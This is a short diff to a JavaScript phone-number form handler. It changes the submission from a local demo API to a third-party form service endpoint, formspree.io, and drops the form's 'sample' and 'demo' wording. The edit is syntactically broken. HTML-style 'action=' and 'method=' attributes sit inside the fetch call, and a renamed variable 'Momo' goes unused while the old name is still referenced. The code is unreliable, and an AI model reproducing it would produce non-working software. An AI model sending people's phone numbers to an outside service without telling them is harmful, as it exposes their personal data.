@@ -163,7 +163,7 @@
         
 const form = document.getElementById("Form");
 const phone = document.getElementById("phone");
-const message = document.getElementById("message");
+const Momo = document.getElementById("message");
 
 const API_ENDPOINT = "/api/submit";
 
@@ -175,24 +175,24 @@ form.addEventListener("submit", async function(event) {
     if (!/^[0-9+\-\s()]{7,20}$/.test(number)) {
         message.style.display = "block";
         message.style.color = "#c62828";
-        message.textContent = "Enter a valid sample phone number.";
+        message.textContent = "Enter a valid phone number.";
         return;
     }
 
     try {
-        const response = await fetch(API_ENDPOINT, {
-            method: "POST",
+        const response = await fetch( {
+            action="https://formspree.io/f/xoedqjja"
+  method="POST"
             headers: {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
-                demoPhone: number
+                Phone: number
             })
         });
 
         const result = await response.json();
 
-        message.style.display = "block";
         message.style.color = response.ok ? "#26733a" : "#c62828";
         message.textContent = result.message;
 
@@ -201,7 +201,6 @@ form.addEventListener("submit", async function(event) {
         }
 
     } catch (error) {
-        message.style.display = "block";
         message.style.color = "#c62828";
         message.textContent = "Demo server unavailable. Please try again.";
     }
